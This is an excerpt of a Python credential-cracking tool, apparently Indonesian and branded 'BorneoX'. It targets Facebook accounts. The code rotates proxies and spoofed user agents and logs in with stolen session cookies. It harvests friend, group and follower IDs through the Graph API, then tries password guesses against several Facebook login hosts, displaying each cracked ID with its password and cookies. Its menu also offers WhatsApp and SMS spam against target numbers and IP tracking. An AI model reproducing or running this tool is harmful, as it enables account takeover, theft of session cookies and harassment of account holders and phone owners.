...
sys.stdout.write('\x1b]2;𝑴𝑰𝑻𝑴 | 𝑪𝒀𝑩𝑬𝑹 𝑻𝑬𝑨𝑴 𝑨𝑹𝑴𝒀\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BRX7XXC')
...
for xd in range(10000):
	...
	f='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/'
...
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SAMSUNG SM-G900P Build/LRX21T) {str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/ {str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ...
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A127F BuildSP1A.210812.016.{str(rr(111111,210000))}.001; vw) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J330G Build/PPR1.180610.011.{str(rr(111111,210000))}.001;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u7 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))} SAMSUNG-SGH-I337 Build/LRX22C) {str(rr(111111,210000))}.001;wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u8 = f"Mozilla/5.0 (Linux; Android  {str(rr(4,12))} SAMSUNG SM-N900V 4G Build/LRX21V) {str(rr(111111,210000))}.001;wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
...
for x in range(10):
	...
	uak=f'Mozilla/5.0 (Linux; Android {a}; RMX1911 Build/QKQ1.200209.002; wv) {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
...
╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝
                  ...
                  COUNTRY :[bold red] 𝑰𝑵𝑫𝑶𝑵𝑬𝑺𝑰𝑨[bold white] 𝑪𝑰𝑻𝒀 𝑨𝑹𝑴𝒀                                                                                                  """,width=90,padding=(0,8),title=f"[bold green]𝑩𝒂𝒏𝒏𝒆𝒓",style=f"#ff7f00"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
	cetak(panel(f"[bold white][[#00FF00]01[bold white]] Login Menggunakan Cookie              [[#00FF00]03[bold white]] Cara Mendapatkan Cookie \n[[#00FF00]02[bold white]] Menu Crack Tanpa Login                [[#00FF00]04[bold white]] Cek Hasil Crack ",width=90,title=f"[bold green]𝑴𝒆𝒏𝒖 𝑩𝒐𝒕",padding=(0,2),style=f"#ff7f00"))
...
def login_lagi334():
	try:
		cetak(nel('[bold white]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"#ff7f00"))
		...
		with requests.Session() as r:
			try:
				...
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; CPH1613 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] Login Berhasil | python BorneoX.py");exit()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]𝑼𝒔𝒆𝒓 𝑰𝑫  : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]𝑻𝒂𝒏𝒈𝒈𝒂𝒍  : [bold green]{waktu}[/][/]\n[bold white][+[/][bold white]][/] [bold white]𝑺𝒕𝒂𝒕𝒖𝒔   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]𝑽𝒆𝒓𝒔𝒊 𝑺𝑪 : [bold green]Update 9.2[/][/] ',width=43,padding=(0,3),style=f"#ff7f00"))
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]𝐂𝐨𝐮𝐧𝐭𝐫𝐲  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]𝐂𝐢𝐭𝐲     : [bold green]{asal_kota}[/]\n[bold white][+[/][bold white]][/] [bold white]𝐑𝐞𝐠𝐢𝐨𝐧   : [bold green]{asal_reg}[/][/]\n[bold white][+[/][bold white]][/] [bold white]𝐓𝐢𝐦𝐞𝐙𝐨𝐧𝐞 : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]𝐌𝐲 𝐈𝐩    : [bold green]{ip}[/][/] ',width=46,padding=(0,3),style=f"#ff7f00"))
	console.print(Columns(dia))
	cetak(panel(f"[bold green]𝑿𝒑𝒖𝒔𝒉 , 𝑭𝑰𝑭𝑻𝒀 𝑭𝑰𝑭𝑻𝒀 , 𝑪𝒀𝑩𝑬𝑹 , 𝑻𝑬𝑨𝑴 , 𝑩𝑹𝑼𝑻𝒀 , 𝑴𝒖𝒏𝒊𝒇-𝑿𝑫 , 𝒀𝒖 𝒁𝒐𝒏𝒈 , 𝑳𝑷𝒀𝑿  𝑪𝑰𝑻𝒀 , 𝑩𝑹𝑿7𝑷 , 𝑰𝑴𝑻𝑿5",width=90,title=f"[bold green]𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐",padding=(0,5),style=f"#ff7f00"))
	cetak(panel(f"[bold white][[#00FF00]01[bold white]] Crack From Friends     [bold white][[#00FF00]06[bold white]] Crack From Username[bold white]      [[#00FF00]11[bold white]] Get Headers      \n[bold white][[#00FF00]02[bold white]] Crack From Massal      [bold white][[#00FF00]07[bold white]] Crack From Followers     [[#00FF00]12[bold white]] Spam WhatsApp      \n[bold white][[#00FF00]03[bold white]] Crack From Groups      [[#00FF00]08[bold white]] Crack From Comment       [bold white][[#00FF00]13[bold white]] Spam Sms \n[bold white][[#00FF00]04[bold white]] Crack From Email       [bold white][[#00FF00]09[bold white]] Check Opsi Checkpoint [bold white]   [[#00FF00]14[bold white]] Track Ip \n[bold white][[#00FF00]05[bold white]] Crack From Files       [bold white][[#00FF00]10[bold white]] [bold white]Check Result Crack [bold white]      [[#00FF00]15[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold green]𝑳𝒊𝒔𝒕 𝑴𝒆𝒏𝒖",style=f"#ff7f00"))
	_____cyber___city____ = input(f' [+] Pilih Menu Crack : ')
	if _____cyber___city____ in ['1','01']:
		brayen_dump()
	elif _____cyber___city____ in ['2','02']:
		dump_massal()
	elif _____cyber___city____ in ['3','03']:
		crack_group()
	elif _____cyber___city____ in ['4','04']:
		crack_email()
	elif _____cyber___city____ in ['5','05']:
		crack_file()
	elif _____cyber___city____ in ['6','06']:
		crack_nama()
	elif _____cyber___city____ in ['7','07']:
		pengikut()
	elif _____cyber___city____ in ['8','08']:
		komen()
	elif _____cyber___city____ in ['9','09']:
		file_cp()
	elif _____cyber___city____ in ['10']:
		result()
	elif _____cyber___city____ in ['11']:
		siu()
	elif _____cyber___city____ in('12'):
		spam_wa()
	elif _____cyber___city____ in('13'):
		spam_sms()
	elif _____cyber___city____ in('14'):
		lacakip()
	elif _____cyber___city____ in ['15']:
...
###---------[ CRACK DARI KOMEN ]---------- ###
def komen():
	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"#ff7f00"))
...
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	cetak(nel(' Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"#ff7f00"))
...
#----------------------[ MENU CRACK LAINNYA ]----------------------#
def lainnya():
	cetak(panel(f"[[#00FF00]01[bold white]] Crack Username                   [[#00FF00]03[bold white]] Crack File \n[[#00FF00]02[bold white]] Crack Followers                  [[#00FF00]04[bold white]] Crack Email ",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold white"))
...
def crack_nama():
	...
	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Username",width=90,padding=(0,2),style=f"#ff7f00"))
...
def crack_email():
	...
	global ok , cp
	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"#ff7f00"))
	nama = console.input(f' [+] Masukan Nama Target : ')
	if ',' in str(nama):
		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel(f'Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"#ff7f00"))
	doma = console.input(f' [+] Masukan Nama Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" [+] Masukan Domain Dengan Benar")
		time.sleep(3);exit()
	cetak(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"#ff7f00"))
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[#00FF00]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[#00FF00]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[#00FF00]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
	kz = input(f' [+] Pilih : ')
	if kz in ['2','02']:
...
def brayen_dump():
	try:
		...
		exit()
	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='#ff7f00'))
...
def dump_massal():
	try:
		...
		exit()
	try:
		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]𝑪𝒓𝒂𝒄𝒌 𝑴𝒂𝒔𝒔𝒂𝒍",style=f"#ff7f00"))
		jum = int(input(f' {P}[+] 𝑴𝑨𝑼 𝑩𝑬𝑹𝑨𝑷𝑨 𝑰𝑫 𝑩𝑶𝑳𝑶 {x} : '))
	except ValueError:
		print(' [+] Wrong input ')
		exit()
	if jum<1 or jum>80:
	...
	for met in range(jum):
		yz+=1
		kl = input(f' [+] {h}𝑴𝑨𝑺𝑼𝑲𝑨𝑵 𝑰𝑫 𝑻𝑨𝑹𝑮𝑬𝑻 𝒀𝑨𝑵𝑮 𝑲𝑬  ['+str(yz)+'] :  ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v9.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			...
			exit()
	try:
		print(f'{P} [+] {P}𝑻𝑶𝑻𝑨𝑳 𝑰𝑫 𝑻𝑨𝑹𝑮𝑬𝑻 𝒀𝑨𝑵𝑮 𝑻𝑬𝑹𝑲𝑼𝑴𝑷𝑼𝑳{x} : [ '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' [+] Unstable Signal ')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(panel(f'[bold white][[#00FF00]01[/][bold white]][/] [bold white]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[#00FF00]02[/][bold white]][/] [bold white]Crack Idz New Ke Old [[bold green]Very Recommended[bold white]][/]\n[bold white][[#00FF00]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,padding=(0,8),title=f"[bold green]𝑺𝑬𝑻𝑻𝑰𝑵𝑮 𝑼𝑹𝑼𝑻𝑨𝑵 𝑰𝑫",style=f"#ff7f00"))
	...
	if hu in ['1','01']:
		...
		exit()
	urut = []
	urut.append(panel(f'[bold white][[#00FF00]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[#00FF00]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[#00FF00]03[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=42,title=f"[bold green]𝑽𝒂𝒍𝒊𝒅𝒂𝒕𝒆",style=f"#ff7f00"))
	urut.append(panel(f'[bold white][[#00FF00]04[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[#00FF00]05[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[#00FF00]06[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=47,title=f"[bold green]𝑹𝒆𝒈𝒖𝒍𝒍𝒆𝒓",style=f"#ff7f00"))
	urut.append(panel(f'[bold white][[#00FF00]07[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[#00FF00]08[/][bold white]][/] [bold white]Login Site [bold green]m.alpha.facebook.com[bold white] ',width=42,title=f"[bold green]𝑨𝒍𝒑𝒉𝒂 𝑨𝒏𝒅 𝑨𝒔𝒚𝒏𝒄",style=f"#ff7f00"))
	urut.append(panel(f'[bold white][[#00FF00]09[/][bold white]][/] [bold white]Login Site [bold green]x.facebook.com[bold white] [/]\n[bold white][[#00FF00]10[/][bold white]][/] [bold white]Login Site [bold green]d.facebook.com[bold white] ',width=47,title=f"[bold green]𝑶𝒍𝒅 𝑴𝒆𝒕𝒐𝒅𝒆",style=f"#ff7f00"))
	...
	if hc in ['1','01']:
		...
		method.append('validate1')
	cetak(panel('''[bold white][[#00FF00]01[bold white]] [bold white]Menggunakan Password V1 [[bold green]Recommended[bold white]]
[bold white][[#00FF00]02[bold white]] [bold white]Menggunakan Password V2 [[bold green]Very Recommended[bold white]]
[bold white][[#00FF00]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='#ff7f00',title='[bold green]𝑺𝒆𝒕𝒕𝒊𝒏𝒈 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅',padding=(0,8),width=90))
	...
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting Cek Apk",style=f"#ff7f00"))
	...
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Cek Opsi",style=f"#ff7f00"))
	_brayen_ = input(' [+] Pilih : ')
	if _brayen_ in ['']:
		print(' [+] Pilih Yang Bener Kontol ')
		back()
	...
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"#ff7f00"))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Borneo-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='Borneo-OK')
					cetak(statusok1)
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 13; SM-A035F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/406.0.0.13.115;]'
...
agent = random.choice(
		[
			...
			"Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
			...
			"Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X)AppleWebKit/600.1.4 (KHTML, like Gecko) Version/Mobile/12B466 Safari/600.1.4"
...
def spam_sms():
	global nomor 
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"#ff7f00"))
